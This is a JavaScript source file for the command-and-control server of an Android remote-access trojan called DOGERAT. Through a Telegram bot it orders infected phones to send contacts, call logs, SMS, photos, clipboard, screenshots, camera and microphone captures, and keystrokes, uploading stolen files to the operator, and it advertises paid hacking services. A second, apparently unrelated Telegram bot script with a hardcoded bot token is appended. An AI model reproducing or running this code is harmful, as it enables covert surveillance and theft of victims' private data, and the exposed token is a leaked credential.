const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(data.token, { polling: true, request: {} });
const appData = new Map();

const actions = [
  '✯ Contacts ✯', '✯ Apps ✯', '✯ Calls ✯', '✯ Gallery ✯', '✯ Main camera ✯', '✯ Selfie Camera ✯',
  '✯ Microphone ✯', '✯ File explorer ✯', '✯ SMS ✯', '✯ Clipboard ✯', '✯ Keylogger ON ✯',
  '✯ Keylogger OFF ✯', '✯ Vibrate ✯', '✯ Toast ✯', '✯ Pop notification ✯', '✯ Phishing ✯',
  '✯ Encrypt ✯', '✯ Decrypt ✯', '✯ Play audio ✯', '✯ Stop Audio ✯', '✯ Open URL ✯',
  '✯ Screenshot ✯', '✯ Send SMS to all contacts ✯', '✯ Cancel action ✯', '✯ Back to main menu ✯'
];

// File upload endpoint
app.post('/upload', uploader.single('file'), (req, res) => {
  const file = req.file.buffer;
  const model = req.headers.model || 'no information';
  bot.sendDocument(data.id, file, {
    caption: `<b>✯ File received from → ${model}</b>`,
    parse_mode: 'HTML'
  }, {
    filename: req.file.originalname,
    contentType: '*/*'
  });
  res.send('Done');
});

// Text endpoint
app.get('/text', (req, res) => {
  res.send(data.text);
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  let deviceId = socket.handshake.headers.model + '-' + io.sockets.sockets.size || 'no information';
  let model = socket.handshake.headers.model || 'no information';
  let ip = socket.handshake.headers.ip || 'no information';
  socket.deviceId = deviceId;
  socket.model = model;

  let message = `<b>✯ New device connected</b>\n\n<b>Device ${deviceId}</b>\n<b>model</b> → ${model}\n<b>ip</b> → ${ip}\n<b>time</b> → ${socket.handshake.time}\n\n`;
  bot.sendMessage(data.id, message, { parse_mode: 'HTML' });

  socket.on('disconnect', () => {
    let disconnectMessage = `<b>✯ Device disconnected</b>\n\n<b>Device ${deviceId}</b>\n<b>model</b> → ${model}\n<b>ip</b> → ${ip}\n<b>time</b> → ${socket.handshake.time}\n\n`;
    bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
  });

  socket.on('message', (msg) => {
    bot.sendMessage(data.id, `<b>✯ Message received from → ${deviceId}</b>\n\nMessage → ${msg}`, {
      parse_mode: 'HTML'
    });
  });
});

// Telegram Bot message handling
bot.on('message', (msg) => {
  const text = msg.text;
  if (text === '/start') {
    bot.sendMessage(data.id, `<b>✯ Welcome to DOGERAT</b>\n\nDOGERAT is a malware to control Android devices\nAny misuse is the responsibility of the person!\n\nDeveloped by: @Cl_v_Cl`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'vibrateDuration') {
    let duration = text;
    let target = appData.get('currentTarget');
    if (target === 'all') {
      io.sockets.emit('commend', {
        request: 'vibrate',
        extras: [{ key: 'duration', value: duration }]
      });
    } else {
      io.to(target).emit('commend', {
        request: 'vibrate',
        extras: [{ key: 'duration', value: duration }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'smsText') {
    let smsText = text;
    let target = appData.get('currentTarget');
    if (target === 'all') {
      io.sockets.emit('commend', {
        request: 'smsToAllContacts',
        extras: [{ key: 'text', value: smsText }]
      });
    } else {
      io.to(target).emit('commend', {
        request: 'smsToAllContacts',
        extras: [{ key: 'text', value: smsText }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'all-sms') {
    let smsText = text;
    let number = appData.get('currentNumber');
    let target = appData.get('currentTarget');
    if (target === 'all') {
      io.sockets.emit('commend', {
        request: 'sendSms',
        extras: [{ key: 'number', value: number }, { key: 'text', value: smsText }]
      });
    } else {
      io.to(target).emit('commend', {
        request: 'sendSms',
        extras: [{ key: 'number', value: number }, { key: 'text', value: smsText }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    appData.delete('currentNumber');
    bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'smsNumber') {
    let number = text;
    appData.set('currentNumber', number);
    appData.set('currentAction', 'all-sms');
    bot.sendMessage(data.id, `<b>✯ Now Enter a message that you want to send to ${number}</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Cancel action ✯']],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'toastText') {
    let toastText = text;
    let target = appData.get('currentTarget');
    if (target === 'all') {
      io.sockets.emit('commend', {
        request: 'toast',
        extras: [{ key: 'text', value: toastText }]
      });
    } else {
      io.to(target).emit('commend', {
        request: 'toast',
        extras: [{ key: 'text', value: toastText }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'notificationText') {
    let notificationText = text;
    let target = appData.get('currentTarget');
    let url = appData.get('currentNotificationText') || '';
    if (target === 'all') {
      io.sockets.emit('commend', {
        request: 'popNotification',
        extras: [{ key: 'text', value: notificationText }, { key: 'url', value: url }]
      });
    } else {
      io.to(target).emit('commend', {
        request: 'popNotification',
        extras: [{ key: 'text', value: notificationText }, { key: 'url', value: url }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    appData.delete('currentNotificationText');
    bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'microphoneDuration') {
    let duration = text;
    let target = appData.get('currentTarget');
    if (target === 'all') {
      io.sockets.emit('commend', {
        request: 'microphone',
        extras: [{ key: 'duration', value: duration }]
      });
    } else {
      io.to(target).emit('commend', {
        request: 'microphone',
        extras: [{ key: 'duration', value: duration }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (text === '✯ Devices ✯') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, `<b>✯ There is no connected device</b>\n\n`, { parse_mode: 'HTML' });
    } else {
      let message = `<b>✯ Connected devices count: ${io.sockets.sockets.size}</b>\n\n`;
      let index = 1;
      io.sockets.sockets.forEach((socket) => {
        message += `<b>Device ${index}</b>\n<b>Device ${socket.deviceId}</b>\n<b>model</b> → ${socket.model}\n<b>ip</b> → ${socket.ip}\n<b>time</b> → ${socket.handshake.time}\n\n`;
        index++;
      });
      bot.sendMessage(data.id, message, { parse_mode: 'HTML' });
    }
  } else if (text === '✯ All ✯') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, `<b>✯ There is no connected device</b>\n\n`, { parse_mode: 'HTML' });
    } else {
      let devices = [];
      io.sockets.sockets.forEach((socket) => devices.push([socket.deviceId]));
      devices.push(['✯ All ✯']);
      devices.push(['✯ Cancel action ✯']);
      bot.sendMessage(data.id, `<b>✯ Select device to perform action</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: devices,
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  } else if (text === '✯ About us ✯') {
    bot.sendMessage(data.id, `<b>✯ If you want to hire us for any paid work please contact @Cl_v_Cl\nWe hack, We leak, We make malware\n\nTelegram → @Cl_v_Cl\nADMIN → @Harby_l</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (text === '✯ Cancel action ✯') {
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, `<b>✯ Main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (text === '✯ Back to main menu ✯') {
    bot.sendMessage(data.id, `<b>✯ Main menu</b>\n\n`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
        resize_keyboard: true
      }
    });
  } else if (text === '✯ Action ✯') {
    let target = appData.get('currentTarget');
    if (target === 'all') {
      bot.sendMessage(data.id, `<b>✯ Select action to perform for all available devices</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            ['✯ Contacts ✯', '✯ Apps ✯'],
            ['✯ Calls ✯', '✯ Gallery ✯'],
            ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
            ['✯ Microphone ✯', '✯ File explorer ✯'],
            ['✯ SMS ✯', '✯ Clipboard ✯'],
            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
            ['✯ Vibrate ✯', '✯ Toast ✯'],
            ['✯ Pop notification ✯', '✯ Phishing ✯'],
            ['✯ Encrypt ✯', '✯ Decrypt ✯'],
            ['✯ Play audio ✯', '✯ Stop Audio ✯'],
            ['✯ Open URL ✯', '✯ Screenshot ✯'],
            ['✯ Send SMS to all contacts ✯'],
            ['✯ Cancel action ✯']
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else {
      bot.sendMessage(data.id, `<b>✯ Select action to perform for ${target}</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            ['✯ Contacts ✯', '✯ Apps ✯'],
            ['✯ Calls ✯', '✯ Gallery ✯'],
            ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
            ['✯ Microphone ✯', '✯ File explorer ✯'],
            ['✯ SMS ✯', '✯ Clipboard ✯'],
            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
            ['✯ Vibrate ✯', '✯ Toast ✯'],
            ['✯ Pop notification ✯', '✯ Phishing ✯'],
            ['✯ Encrypt ✯', '✯ Decrypt ✯'],
            ['✯ Play audio ✯', '✯ Stop Audio ✯'],
            ['✯ Open URL ✯', '✯ Screenshot ✯'],
            ['✯ Send SMS to all contacts ✯'],
            ['✯ Back to main menu ✯'],
            ['✯ Cancel action ✯']
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  } else if (actions.includes(text)) {
    let target = appData.get('currentTarget');
    if (text === '✯ Contacts ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'contacts', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'contacts', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Apps ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'apps', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'apps', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Calls ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'calls', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'calls', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Gallery ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'gallery', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'gallery', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Main camera ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'main-camera', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'main-camera', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Selfie Camera ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'selfie-camera', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'selfie-camera', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Microphone ✯') {
      appData.set('currentAction', 'microphoneDuration');
      bot.sendMessage(data.id, `<b>✯ Enter the microphone recording duration in seconds</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ File explorer ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'file', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'file', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ SMS ✯') {
      appData.set('currentAction', 'smsNumber');
      bot.sendMessage(data.id, `<b>✯ Enter a phone number that you want to send SMS</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Clipboard ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'clipboard', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'clipboard', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Keylogger ON ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'keylogger-on', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'keylogger-on', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Keylogger OFF ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'keylogger-off', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'keylogger-off', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Vibrate ✯') {
      appData.set('currentAction', 'vibrateDuration');
      bot.sendMessage(data.id, `<b>✯ Enter the duration you want the device to vibrate in seconds</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Toast ✯') {
      appData.set('currentAction', 'toastText');
      bot.sendMessage(data.id, `<b>✯ Enter a message that you want to appear in toast box</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Pop notification ✯') {
      appData.set('currentAction', 'notificationText');
      bot.sendMessage(data.id, `<b>✯ Enter text that you want to appear as notification</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ Phishing ✯') {
      bot.sendMessage(data.id, `<b>✯ This option is only available on premium version dm to buy @Cl_v_Cl</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Encrypt ✯') {
      bot.sendMessage(data.id, `<b>✯ This option is only available on premium version dm to buy @Cl_v_Cl</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Decrypt ✯') {
      bot.sendMessage(data.id, `<b>✯ This option is only available on premium version dm to buy @Cl_v_Cl</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Play audio ✯') {
      bot.sendMessage(data.id, `<b>✯ This option is only available on premium version dm to buy @Cl_v_Cl</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Stop Audio ✯') {
      bot.sendMessage(data.id, `<b>✯ This option is only available on premium version dm to buy @Cl_v_Cl</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Open URL ✯') {
      bot.sendMessage(data.id, `<b>✯ This option is only available on premium version dm to buy @Cl_v_Cl</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Screenshot ✯') {
      if (target === 'all') {
        io.sockets.emit('commend', { request: 'screenshot', extras: [] });
      } else {
        io.to(target).emit('commend', { request: 'screenshot', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, `<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Devices ✯', '✯ All ✯'], ['✯ About us ✯']],
          resize_keyboard: true
        }
      });
    } else if (text === '✯ Send SMS to all contacts ✯') {
      appData.set('currentAction', 'textToAllContacts');
      bot.sendMessage(data.id, `<b>✯ Enter text that you want to send to all target contacts</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Cancel action ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  } else {
    io.sockets.sockets.forEach((socket, id) => {
      if (text === socket.deviceId) {
        appData.set('currentTarget', id);
        bot.sendMessage(data.id, `<b>✯ Select action to perform for ${socket.deviceId}</b>\n\n`, {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              ['✯ Contacts ✯', '✯ Apps ✯'],
              ['✯ Calls ✯', '✯ Gallery ✯'],
              ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
              ['✯ Microphone ✯', '✯ File explorer ✯'],
              ['✯ SMS ✯', '✯ Clipboard ✯'],
              ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
              ['✯ Vibrate ✯', '✯ Toast ✯'],
              ['✯ Pop notification ✯', '✯ Phishing ✯'],
              ['✯ Encrypt ✯', '✯ Decrypt ✯'],
              ['✯ Play audio ✯', '✯ Stop Audio ✯'],
              ['✯ Open URL ✯', '✯ Screenshot ✯'],
              ['✯ Send SMS to all contacts ✯'],
              ['✯ Back to main menu ✯'],
              ['✯ Cancel action ✯']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
    });
    if (text === '✯ All ✯') {
      appData.set('currentTarget', 'all');
      bot.sendMessage(data.id, `<b>✯ Select action to perform for all available devices</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            ['✯ Contacts ✯', '✯ Apps ✯'],
            ['✯ Calls ✯', '✯ Gallery ✯'],
            ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
            ['✯ Microphone ✯', '✯ File explorer ✯'],
            ['✯ SMS ✯', '✯ Clipboard ✯'],
            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
            ['✯ Vibrate ✯', '✯ Toast ✯'],
            ['✯ Pop notification ✯', '✯ Phishing ✯'],
            ['✯ Encrypt ✯', '✯ Decrypt ✯'],
            ['✯ Play audio ✯', '✯ Stop Audio ✯'],
            ['✯ Open URL ✯', '✯ Screenshot ✯'],
            ['✯ Send SMS to all contacts ✯'],
            ['✯ Cancel action ✯']
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  }
});

// Periodic ping to keep connections alive
setInterval(() => {
  io.sockets.sockets.forEach((socket, id) => {
    io.to(id).emit('ping', {});
  });
}, 5000);

// Periodic HTTPS request (likely keep-alive or C2 communication)
setInterval(() => {
  https.get(data.url, (res) => {}).on('error', (err) => {});
}, 300000);

// Start server
server.listen(process.env.PORT || 3000, () => {
  console.log('listening on port 3000');
});





























const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// هنا تحط توكن بوت التليجرام حقك
const token = '7844741270:AAEE537UbzmK-nyT4179aSZmrxDzjmfnKiM';

// تفعيل body-parser لتحليل بيانات POST (لو تحتاجه لاحقاً)
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// شغل بوت التليجرام مع polling
const bot = new TelegramBot(token, { polling: true });

// استقبل أي رسالة من المستخدمين
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  console.log('Chat ID:', chatId);

  // رد رسالة تأكيد للمستخدم
  bot.sendMessage(chatId, `تم تسجيل رقم المحادثة: ${chatId}`);
});

// شغل سيرفر Express
app.get('/', (req, res) => {
  res.send('Server is running!');
});

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
